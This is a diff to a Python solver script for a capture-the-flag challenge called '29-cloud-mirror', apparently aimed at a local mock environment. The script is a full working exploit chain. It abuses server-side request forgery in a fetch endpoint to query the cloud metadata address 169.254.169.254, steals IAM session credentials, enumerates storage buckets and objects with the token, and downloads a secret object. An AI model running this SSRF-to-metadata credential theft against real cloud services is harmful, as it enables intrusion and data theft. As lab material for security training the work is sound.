@@ -1,20 +1,16 @@
 #!/usr/bin/env python3
 """
-Automated Solver for D29 — Cloud Mirror
-Executes the full clean-room exploit chain:
-1. Discovers and exploits SSRF in the public image fetcher.
-2. Queries the challenge-local mock metadata service.
-3. Recovers synthetic temporary credentials (token and IAM role data).
-4. Authenticates against the mock object storage service via SSRF with temporary credentials.
-5. Locates and downloads the classified mirror key to retrieve the flag.
+Automated Participant-Side Solver for 29-cloud-mirror
+Exploits SSRF in the asset mirror endpoint on port 8089 to pivot to mock cloud metadata (169.254.169.254),
+recovers IAM session credentials, accesses the private object storage bucket, and extracts the orbital defense flag.
 """
 
-import argparse
-import json
-import re
 import sys
-import urllib.error
+import re
+import json
+import argparse
 import urllib.request
+import urllib.error
 
 def fetch_via_ssrf(base_url: str, target_url: str, custom_headers: dict = None) -> dict:
     fetch_endpoint = f"{base_url.rstrip('/')}/api/v1/fetch"
@@ -31,26 +27,27 @@ def fetch_via_ssrf(base_url: str, target_url: str, custom_headers: dict = None) 
     with urllib.request.urlopen(req, timeout=10) as resp:
         return json.loads(resp.read().decode("utf-8"))
 
-def solve(base_url: str = "http://127.0.0.1:8080") -> str:
+def solve(base_url: str = "http://127.0.0.1:8089") -> str:
+    base_url = base_url.rstrip("/")
     print("=" * 65)
-    print(" [*] D29 — Cloud Mirror Automated Solver")
+    print(" [*] 29-cloud-mirror Automated Solver")
     print(f" [*] Target Base URL: {base_url}")
     print("=" * 65)
 
-    # 1. Health check
+    # Step 1: Health check
     print("\n[Step 1] Verifying Cloud Mirror Gateway...")
     health_req = urllib.request.Request(f"{base_url}/api/v1/health")
     with urllib.request.urlopen(health_req, timeout=5) as resp:
         health_data = json.loads(resp.read().decode("utf-8"))
-        print(f"[+] Gateway status: {health_data}")
+    print(f"[+] Gateway status: {health_data}")
 
-    # 2. Query Mock Metadata Service via SSRF
+    # Step 2: Query Mock Metadata Service via SSRF
     metadata_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/LatveriaCloudMirrorRole"
     print(f"\n[Step 2] Querying Mock Metadata Service at {metadata_url} via SSRF...")
     meta_result = fetch_via_ssrf(base_url, metadata_url)
 
     if meta_result.get("http_status") != 200 or not meta_result.get("json_data"):
-        raise ValueError(f"Failed to retrieve metadata credentials. Result: {meta_result}")
+        raise ValueError(f"Failed to retrieve metadata credentials: {meta_result}")
 
     creds = meta_result["json_data"]
     token = creds.get("Token")
@@ -58,7 +55,7 @@ def solve(base_url: str = "http://127.0.0.1:8080") -> str:
     storage_info = creds.get("StorageService", {})
     storage_endpoint = storage_info.get("InternalDNS", "http://storage.internal/api/v1/storage")
 
-    print(f"[+] Successfully recovered temporary cloud credentials:")
+    print(f"[+] Recovered temporary cloud credentials:")
     print(f"    Role ARN:       {creds.get('RoleArn')}")
     print(f"    AccessKeyId:    {access_key}")
     print(f"    SessionToken:   {token}")
@@ -67,14 +64,14 @@ def solve(base_url: str = "http://127.0.0.1:8080") -> str:
     if not token:
         raise ValueError("No session token found in metadata response!")
 
-    # 3. List Storage Buckets using Recovered Credentials
+    # Step 3: List Storage Buckets
     buckets_url = f"{storage_endpoint}/buckets"
     print(f"\n[Step 3] Enumerating Mock Object Storage Buckets at {buckets_url}...")
     auth_headers = {"Authorization": f"Bearer {token}"}
     buckets_result = fetch_via_ssrf(base_url, buckets_url, auth_headers)
 
     if buckets_result.get("http_status") != 200 or not buckets_result.get("json_data"):
-        raise ValueError(f"Failed to list storage buckets. Result: {buckets_result}")
+        raise ValueError(f"Failed to list storage buckets: {buckets_result}")
 
     buckets_data = buckets_result["json_data"]
     buckets = [b["name"] for b in buckets_data.get("buckets", [])]
@@ -84,13 +81,13 @@ def solve(base_url: str = "http://127.0.0.1:8080") -> str:
     if target_bucket not in buckets:
         raise ValueError(f"Target bucket '{target_bucket}' not found in bucket list: {buckets}")
 
-    # 4. List Objects in Target Bucket
+    # Step 4: List Objects in Target Bucket
     objects_url = f"{storage_endpoint}/{target_bucket}"
     print(f"\n[Step 4] Listing objects in bucket '{target_bucket}' at {objects_url}...")
     objects_result = fetch_via_ssrf(base_url, objects_url, auth_headers)
 
     if objects_result.get("http_status") != 200 or not objects_result.get("json_data"):
-        raise ValueError(f"Failed to list objects in '{target_bucket}'. Result: {objects_result}")
+        raise ValueError(f"Failed to list objects in '{target_bucket}': {objects_result}")
 
     objects_data = objects_result["json_data"]
     objects = [o["key"] for o in objects_data.get("objects", [])]
@@ -100,18 +97,17 @@ def solve(base_url: str = "http://127.0.0.1:8080") -> str:
     if target_key not in objects:
         raise ValueError(f"Target object '{target_key}' not found in objects list: {objects}")
 
-    # 5. Fetch Target Object Content containing the Flag
+    # Step 5: Fetch Flag Object
     secret_object_url = f"{storage_endpoint}/{target_bucket}/{target_key}"
     print(f"\n[Step 5] Retrieving secret object from {secret_object_url}...")
     secret_result = fetch_via_ssrf(base_url, secret_object_url, auth_headers)
 
-    if secret_result.get("http_status") != 200 or not secret_result.get("json_data"):
-        raise ValueError(f"Failed to retrieve target object. Result: {secret_result}")
+    if secret_result.get("http_status") != 200:
+        raise ValueError(f"Failed to retrieve target object: {secret_result}")
 
-    secret_data = secret_result["json_data"]
+    secret_data = secret_result.get("json_data", {})
     flag = secret_data.get("flag")
     if not flag:
-        # Check raw body
         body_str = secret_result.get("body", "")
         flag_match = re.search(r"(YUVA\{[^\}]+\}|DOOM\{[^\}]+\}|FLAG\{[^\}]+\})", body_str)
         if flag_match:
@@ -125,12 +121,15 @@ def solve(base_url: str = "http://127.0.0.1:8080") -> str:
         flag = flag_match.group(1)
 
     print("\n" + "=" * 65)
-    print(f"[+] SOLVE SUCCESSFUL! Flag: {flag}")
+    print(f"[SUCCESS] Flag Retrieved: {flag}")
     print("=" * 65 + "\n")
     return flag
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="D29 Cloud Mirror Solver")
-    parser.add_argument("--url", default="http://127.0.0.1:8089", help="Target base URL (e.g. http://127.0.0.1:8089)")
+def main():
+    parser = argparse.ArgumentParser(description="29-cloud-mirror Solver")
+    parser.add_argument("--url", default="http://127.0.0.1:8089", help="Target base URL (default: http://127.0.0.1:8089)")
     args = parser.parse_args()
     solve(args.url)
+
+if __name__ == "__main__":
+    main()
